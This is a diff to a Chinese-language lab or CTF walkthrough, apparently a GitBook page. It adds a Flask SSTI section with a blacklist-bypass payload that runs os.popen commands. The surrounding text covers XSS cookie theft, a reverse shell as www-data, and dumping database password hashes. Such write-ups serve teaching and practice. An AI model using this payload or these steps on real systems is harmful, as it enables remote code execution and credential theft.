@@ -52,13 +52,19 @@ Task Completed
 
 扫描结果没啥用, 就一个dashboard值得关注.
 
+### 1.3 指纹信息
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+开发框架是Flask,猜测漏洞为模板注入.
+
 ### 二、渗透过程
 
 ### 2.1 XSS获取管理员cookie
 
 随便逛逛可以发现有一个quote页面,页面可以给管理员留言,尝试是否存在xss,能否利用xss获取管理员cookie.
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>burp suite 抓包</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>burp suite 抓包</p></figcaption></figure>
 
 其中exp是url encode过的.
 
@@ -77,7 +83,33 @@ Serving HTTP on 0.0.0.0 port 959 (http://0.0.0.0:959/) ...
 
 成功获取cookie, 将cookie加入到header中,再去访问dashboard.
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 成功进入到dashboard页面.
+
+### 2.2 Flask SSTI 反弹shell
+
+开发框架是Flask,猜测漏洞为模板注入.
+
+在Generate invoice下生成一个id,然后到Gnerate QR下尝试.
+
+<figure><img src="../.gitbook/assets/4ac119a9433cd746fa3d45d2e9b96d7.png" alt=""><figcaption></figcaption></figure>
+
+可以发现qr\_link字段存在模板注入.一般的模板注入在这里是失效的,应该是存在黑名单之类的过滤手段,这里使用resquet和attr组合进行绕过,exp如下:
+
+```
+{{ request | attr("application") | attr("\x5f\x5fglobals\x5f\x5f") | attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os") | attr("popen")("uname -a") | attr("read")() }}
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+接下来就利用这个注入点反弹shell,需要进行url encode.
+
+<figure><img src="../.gitbook/assets/0f9992e7611a8efaed1c3810592ce7c.png" alt=""><figcaption></figcaption></figure>
+
+成功获取www-data权限,查看app.py文件,发现数据库相关信息.
+
+<figure><img src="../.gitbook/assets/86edeef6eb3de119a224042dbc60d82.png" alt=""><figcaption></figcaption></figure>
+
+连接数据库,在user表下发现账号以及口令的hash值.
 
